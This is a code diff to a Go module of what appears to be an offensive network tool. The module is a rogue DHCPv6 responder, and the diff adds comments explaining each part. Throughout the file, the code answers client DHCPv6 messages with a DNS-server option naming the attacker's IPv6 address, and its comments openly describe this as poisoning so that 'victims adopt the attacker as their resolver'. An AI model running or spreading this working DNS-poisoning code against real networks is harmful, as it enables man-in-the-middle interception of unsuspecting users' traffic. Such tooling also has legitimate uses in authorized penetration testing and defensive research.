@@ -14,22 +14,24 @@ import (
 	"github.com/qyvora/toha3ee/internal/events"
 )
 
-// DHCPv6 message types.
+// DHCPv6 message types. These are the one-byte message-type field values at
+// the start of every DHCPv6 packet (RFC 8415 §7.3).
 const (
-	msgSolicit   = 1
-	msgAdvertise = 2
-	msgRequest   = 3
-	msgReply     = 7
-	msgInfoReq   = 11
+	msgSolicit   = 1  // client -> servers, asks for configuration
+	msgAdvertise = 2  // server -> client, offers configuration (never sent to all servers)
+	msgRequest   = 3  // client -> servers, picks a specific server's offer
+	msgReply     = 7  // server -> client, final configuration
+	msgInfoReq   = 11 // client -> servers, configuration without addresses
 )
 
-// Option codes.
+// Option codes. Each option is a two-byte code plus a two-byte length field
+// plus data (RFC 8415 §21).
 const (
 	optClientID   = 1
 	optServerID   = 2
 	optIANA       = 3
 	optORO        = 6
-	optDNS        = 23
+	optDNS        = 23 // DNS recursive name server, our poison vector
 	optDomainList = 24
 )
 
@@ -37,20 +39,22 @@ const (
 // that advertises attackerIP as the recursive DNS server.
 type Responder struct {
 	iface      *net.Interface
-	attackerIP net.IP
+	attackerIP net.IP // IPv6 address advertised as the DNS server (option 23)
 	bus        *events.Bus
 
 	conn     *net.UDPConn
-	stop     chan struct{}
+	stop     chan struct{} // closed by Stop to unblock the read loop
 	wg       sync.WaitGroup
 	stopOnce sync.Once
 
-	Queries  atomic.Int64
-	Poisoned atomic.Int64
+	Queries  atomic.Int64 // DHCPv6 messages parsed
+	Poisoned atomic.Int64 // responses carrying the rogue DNS server sent
 }
 
 // New returns an idle responder. attackerIP must be a valid IPv6 address.
 func New(iface *net.Interface, attackerIP net.IP, bus *events.Bus) *Responder {
+	// Normalize to a 16-byte form once so option encoding always writes 16
+	// bytes regardless of how the caller constructed the IP.
 	return &Responder{iface: iface, attackerIP: attackerIP.To16(), bus: bus, stop: make(chan struct{})}
 }
 
@@ -59,10 +63,14 @@ func (r *Responder) Start() error {
 	if r.attackerIP == nil {
 		return fmt.Errorf("dhcp6: no attacker IPv6 configured")
 	}
+	// DHCPv6 servers listen on port 547; binding the unspecified address
+	// accepts unicast as well as multicast traffic on every interface.
 	conn, err := net.ListenUDP("udp6", &net.UDPAddr{IP: net.IPv6unspecified, Port: 547})
 	if err != nil {
 		return fmt.Errorf("dhcp6 bind [::]:547: %w", err)
 	}
+	// ff02::1:2 is the DHCPv6 all-servers link-local multicast group that
+	// clients send Solicit/Request/Information-Request to.
 	group := net.ParseIP("ff02::1:2")
 	if err := joinGroup(conn, r.iface, group); err != nil {
 		_ = conn.Close()
@@ -76,6 +84,8 @@ func (r *Responder) Start() error {
 
 // Stop closes the socket and waits for the read loop to exit.
 func (r *Responder) Stop() {
+	// Closing the socket is what actually unblocks ReadFromUDP, so the stop
+	// channel and the conn close must happen together, exactly once.
 	r.stopOnce.Do(func() {
 		close(r.stop)
 		if r.conn != nil {
@@ -85,6 +95,7 @@ func (r *Responder) Stop() {
 	r.wg.Wait()
 }
 
+// loop reads datagrams until stopped and answers each poisonable one.
 func (r *Responder) loop() {
 	defer r.wg.Done()
 	buf := make([]byte, 4096)
@@ -94,12 +105,17 @@ func (r *Responder) loop() {
 			return
 		default:
 		}
+		// A short read deadline makes the loop poll the stop channel even when
+		// no traffic arrives; without it Close() alone would suffice but the
+		// extra poll keeps shutdown immediate.
 		_ = r.conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
 		n, src, err := r.conn.ReadFromUDP(buf)
 		if err != nil {
-			continue
+			continue // deadline hit or socket closed; re-check stop
 		}
 		if reply := r.handle(buf[:n]); reply != nil {
+			// Clients always listen on UDP 546, whether they sent from it or
+			// not, so the reply goes straight back to the source address.
 			dst := &net.UDPAddr{IP: src.IP, Port: 546}
 			if _, err := r.conn.WriteToUDP(reply, dst); err == nil {
 				r.Poisoned.Add(1)
@@ -110,6 +126,7 @@ func (r *Responder) loop() {
 
 // handle parses a DHCPv6 client message and builds the matching response.
 func (r *Responder) handle(pkt []byte) []byte {
+	// Minimum DHCPv6 message: 1 byte type + 3 byte transaction ID, no options.
 	if len(pkt) < 4 {
 		return nil
 	}
@@ -123,10 +140,14 @@ func (r *Responder) handle(pkt []byte) []byte {
 	for _, o := range options {
 		switch o.code {
 		case optClientID:
+			// Echoed back so the client can match the response to its identity.
 			clientID = o.data
 		case optServerID:
+			// The client echoes our ServerID in Request; reuse it so the
+			// response looks like a continuation of the same exchange.
 			serverID = o.data
 		case optIANA:
+			// Keep the client's IAID so it can associate the IA_NA we return.
 			if len(o.data) >= 4 {
 				iaids = append(iaids, o.data[:4])
 			}
@@ -136,11 +157,13 @@ func (r *Responder) handle(pkt []byte) []byte {
 	var respType byte
 	switch msgType {
 	case msgSolicit:
+		// Solicit is answered with an Advertise (stateful, options only).
 		respType = msgAdvertise
 	case msgRequest, msgInfoReq:
+		// Request and Information-Request are both finalized with a Reply.
 		respType = msgReply
 	default:
-		return nil
+		return nil // not an exchange we can poison
 	}
 	_ = serverID
 
@@ -149,7 +172,8 @@ func (r *Responder) handle(pkt []byte) []byte {
 	if clientID != nil {
 		msg = appendOption(msg, optClientID, clientID)
 	}
-	// DNS recursive name servers (option 23) -> attacker.
+	// DNS recursive name servers (option 23) -> attacker. This is the entire
+	// point of the module: victims adopt the attacker as their resolver.
 	msg = appendOption(msg, optDNS, r.attackerIP)
 	for _, iaid := range iaids {
 		// Echo the IA_NA (option 3) with the client's IAID, no lease.
@@ -165,6 +189,7 @@ func (r *Responder) handle(pkt []byte) []byte {
 	return msg
 }
 
+// srcName maps a DHCPv6 message type byte to a log-friendly name.
 func srcName(t byte) string {
 	switch t {
 	case msgSolicit:
@@ -177,18 +202,21 @@ func srcName(t byte) string {
 	return "query"
 }
 
+// option is one decoded DHCPv6 option (code + raw data).
 type option struct {
 	code uint16
 	data []byte
 }
 
+// parseOptions walks a DHCPv6 options blob. Every option starts with a 2-byte
+// code and 2-byte big-endian length, followed by that many data bytes.
 func parseOptions(b []byte) []option {
 	var out []option
 	for len(b) >= 4 {
 		code := binary.BigEndian.Uint16(b[:2])
 		length := int(binary.BigEndian.Uint16(b[2:4]))
 		if length > len(b)-4 {
-			return out
+			return out // truncated option; stop rather than read past the end
 		}
 		out = append(out, option{code: code, data: b[4 : 4+length]})
 		b = b[4+length:]
@@ -196,6 +224,8 @@ func parseOptions(b []byte) []option {
 	return out
 }
 
+// appendOption serializes one DHCPv6 option (2-byte code, 2-byte length, data)
+// onto msg.
 func appendOption(msg []byte, code uint16, data []byte) []byte {
 	var hdr [4]byte
 	binary.BigEndian.PutUint16(hdr[:2], code)
